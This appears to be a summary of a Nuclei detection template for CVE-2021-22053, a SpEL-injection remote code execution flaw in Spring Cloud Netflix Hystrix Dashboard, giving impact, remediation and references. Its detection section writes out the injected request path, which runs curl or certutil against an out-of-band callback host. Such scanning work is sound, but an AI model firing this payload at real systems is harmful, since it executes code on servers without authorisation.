---
cve_id: CVE-2021-22053
template_path: nuclei-templates/http/cves/2021/CVE-2021-22053.yaml
affected_product: Spring Cloud Netflix Hystrix Dashboard
severity: high
authentication: none
external_callback: true
affected_versions: <2.2.10
preconditions: [using both spring-cloud-netflix-hystrix-dashboard and spring-boot-starter-thymeleaf]
poc_classification: rce
---

## Vulnerability
Spring Cloud Netflix Hystrix Dashboard prior to version 2.2.10 is susceptible to remote code execution. Applications using both `spring-cloud-netflix-hystrix-dashboard` and `spring-boot-starter-thymeleaf` expose evaluation of path elements after `/hystrix/monitor` (or `/hystrix/`) as SpringEL expressions, enabling `T(java.lang.Runtime).getRuntime().exec()` calls from user-controlled URI data.

Impact: arbitrary code execution on the target system.  
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (score 8.8).  
CWE-94.  
Remediation: upgrade to version 2.2.10 or later.

## PoC / Detection
Classification: rce

The template sends two unauthenticated GET requests with injected SpEL payloads to `/hystrix/;a=a/__${T (java.lang.Runtime).getRuntime().exec("curl http://{{interactsh-url}}")}__::.x/` and an equivalent using `certutil -urlcache -split -f http://{{interactsh-url}}`. Detection occurs via OOB HTTP callbacks to interactsh, matching `interactsh_protocol: http` and `User-Agent: (curl|CertUtil)` in the received request.

## References
- https://github.com/SecCoder-Security-Lab/spring-cloud-netflix-hystrix-dashboard-cve-2021-22053
- https://tanzu.vmware.com/security/cve-2021-22053
- https://nvd.nist.gov/vuln/detail/CVE-2021-22053
- https://github.com/trhacknon/Pocingit
- https://github.com/ARPSyndicate/kenzer-templates
